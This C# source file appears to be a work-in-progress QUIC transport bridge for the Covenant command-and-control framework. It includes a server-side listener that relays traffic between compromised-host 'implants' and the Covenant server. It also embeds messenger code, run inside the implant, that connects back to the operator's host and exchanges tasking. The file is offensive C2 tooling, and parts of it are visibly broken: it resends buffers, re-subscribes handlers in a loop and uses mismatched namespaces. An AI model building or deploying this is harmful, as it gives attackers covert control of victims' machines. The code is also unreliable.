using System;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using QuicNet;
using QuicNet.Connections;
using QuicNet.Streams;
using System.Text;

namespace C2Bridge
{
    public class QuicC2Bridge : C2Bridge
    {
        // The External port for the QuicListener
        private int ExternalPort { get; }

        // A list of connected QuicClients, retrieved by their GUID value
        private readonly ConcurrentDictionary<string, QuicStream> Clients = new ConcurrentDictionary<string, QuicStream>();

        // The QuicC2Bridge constructor requires the ExternalPort to be specified in the string[] args.
        public QuicC2Bridge(BridgeConnector connector, BridgeProfile profile, string[] args) : base(connector, profile)
        {
            if (args.Length != 1 || !int.TryParse(args[0], out int ExternalPort))
            {
                Console.Error.WriteLine("Usage: QuicC2Bridge <bridge_connector_args> <external_Quic_port>");
                Environment.Exit(1); return;
            }
            this.ExternalPort = ExternalPort;
        }

        // RunAsync starts the QuicListener and continually waits for new clients
        public override async Task RunAsync(CancellationToken Token)
        {
            // Start the QuicListener
            QuicListener listener = new QuicListener(this.ExternalPort);
            //QuicListener Listener = new QuicListener(IPAddress.Any, this.ExternalPort);;
            listener.Start();

            // Continually wait for new client
            while (!Token.IsCancellationRequested)
            {
                // Handle the client asynchronously in a new thread
                QuicConnection client = listener.AcceptQuicClient();
                _ = Task.Run(() =>
                {
                    //client.ReceiveTimeout = client.SendTimeout = 0;
                    QuicStream stream = client.CreateStream(QuickNet.Utilities.StreamType.ClientBidirectional);
                    //stream.
                    //stream.ReadTimeout = stream.WriteTimeout = Timeout.Infinite;
                    while (!Token.IsCancellationRequested)
                    {
                        // byte[] data;
                        // Read from the implant
                        string read = "";
                        client.OnDataReceived += (c) =>
                        {
                            read += Encoding.UTF8.GetString(c.Data);
                        };
                        //string read = Encoding.UTF8.GetString(data);
                        //string read = await Utilities.ReadStreamAsync(stream);
                        // Write to the Covenant server
                        string guid = this.WriteToConnector(read);
                        if (guid != null)
                        {
                            // Track this GUID -> client mapping, for use within the OnReadBridge function

                            Clients.TryAdd(guid, stream);
                        }
                    }
                });
            }
        }

        // OnReadBridge handles writing data to the implant from the Covenant server and gets called
        // each time data is read from the Covenant server
        protected override void OnReadBridge(object sender, BridgeConnector.ReadBridgeArgs args)
        {
            // Parse the data from the server to determine which implant this data is for
            var parsed = this.BridgeProfile.ParseRead(args.Read);
            if (parsed != null)
            {
                // Retrieve the corresponding QuicClient based upon the parsed GUID
                QuicStream client = this.Clients[parsed.Guid];
                
                //QuicConnection client = this.Clients[parsed.Guid];
                //QuicStream stream = client.CreateStream(QuickNet.Utilities.StreamType.ClientBidirectional);
                // Write the data down to the correct implant QuicClient
                _ = Utilities.WriteStreamAsync(client, args.Read);
            }
        }

        // Returns the code that should be used in the BridgeProfile.BridgeMessengerCode property
        protected override string GetBridgeMessengerCode()
        {
            return this.BridgeMessengerCode;
        }

        private string BridgeMessengerCode { get; } =
@"public interface IMessenger
{
    string Hostname { get; }
    string Identifier { get; set; }
    string Authenticator { get; set; }
    string Read();
    void Write(string Message);
    void Close();
}

public class BridgeMessenger : IMessenger
{
    public string Hostname { get; } = "";
    private int Port { get; }
    public string Identifier { get; set; } = "";
    public string Authenticator { get; set; } = "";

    private string CovenantURI { get; }
    private object _quicLock = new object();
    private string WriteFormat { get; set; }
    public QuicClient client { get; set; }
    public QuicStream stream { get; set; }

    public BridgeMessenger(string CovenantURI, string Identifier, string WriteFormat)
    {
        this.CovenantURI = CovenantURI;
        this.Identifier = Identifier;
        this.Hostname = CovenantURI.Split(':')[0];
        this.Port = int.Parse(CovenantURI.Split(':')[1]);
        this.WriteFormat = WriteFormat;
    }

    public string Read()
    {
        byte[] read = this.ReadBytes();
        if (read == null)
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
            return "";
        }
        return Encoding.UTF8.GetString(read);
    }

    public void Write(string Message)
    {
        try
        {
            lock (_quicLock)
            {
                this.WriteBytes(Encoding.UTF8.GetBytes(Message));
                return;
            }
        }
        catch
        {
            Thread.Sleep(5000);
            this.Close();
            this.Connect();
        }
    }

    public void Close()
    {
        //this.stream.Close();
        //this.client.Close();
    }

    public void Connect()
    {
        try
        {
            this.client = new QuicClient();
            QuicConnection connection = client.Connect(IPAddress.Parse(CovenantURI.Split(':')[0]).ToString(), int.Parse(CovenantURI.Split(':')[1]));
            //client.Connect(IPAddress.Parse(CovenantURI.Split(':')[0]), int.Parse(CovenantURI.Split(':')[1]));
            //client.ReceiveTimeout = 0;
            //client.SendTimeout = 0; 
            this.stream = stream = connection.CreateStream(QuickNet.Utilities.StreamType.ClientBidirectional);
            //this.stream.ReadTimeout = -1;
            //this.stream.WriteTimeout = -1;
            this.Write(String.Format(this.WriteFormat, "", this.Identifier));
            Thread.Sleep(1000);
        }
        catch { }
    }

    private void WriteBytes(byte[] bytes)
    {
        byte[] size = new byte[4];
        size[0] = (byte)(bytes.Length >> 24);
        size[1] = (byte)(bytes.Length >> 16);
        size[2] = (byte)(bytes.Length >> 8);
        size[3] = (byte)bytes.Length;
        this.stream.Send(size);
        //this.stream.Write(size, 0, size.Length);
        var writtenBytes = 0;
        while (writtenBytes < bytes.Length)
        {
            int bytesToWrite = Math.Min(bytes.Length - writtenBytes, 1024);
            this.stream.Send(bytes);
            //this.stream.Write(bytes, writtenBytes, bytesToWrite);
            writtenBytes += bytesToWrite;
        }
    }

    private byte[] ReadBytes()
    {
        return this.stream.Receive();
        /*
        byte[] size = new byte[4];
        int totalReadBytes = 0;
        int readBytes = 0;
        do
        {
            //readBytes = this.stream.Re
            readBytes = this.stream.Read(size, 0, size.Length);
            if (readBytes == 0) { return null; }
            totalReadBytes += readBytes;
        } while (totalReadBytes < size.Length);
        int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

        byte[] buffer = new byte[1024];
        using (var ms = new MemoryStream())
        {
            totalReadBytes = 0;
            readBytes = 0;
            do
            {
                readBytes = this.stream.Read(buffer, 0, buffer.Length);
                if (readBytes == 0) { return null; }
                ms.Write(buffer, 0, readBytes);
                totalReadBytes += readBytes;
            } while (totalReadBytes < len);
            return ms.ToArray();
        }
        */
    }
}";
    }
}
